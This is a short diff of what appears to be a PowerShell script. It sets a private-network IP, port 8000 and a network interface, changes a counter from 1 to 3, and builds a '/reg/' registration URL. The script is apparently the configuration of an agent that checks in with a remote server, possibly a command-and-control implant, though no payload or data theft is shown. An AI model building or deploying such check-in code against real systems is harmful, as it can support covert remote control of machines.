@@ -78,7 +78,8 @@ $ip   = "192.168.116.129"
 $port = "8000"
 $interface = "eth0"
 # $key  = "REPLACE_KEY"
-$n    = 1
+$n = 3
+# $n    = replace_j
 
 $regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
 $data  = @{
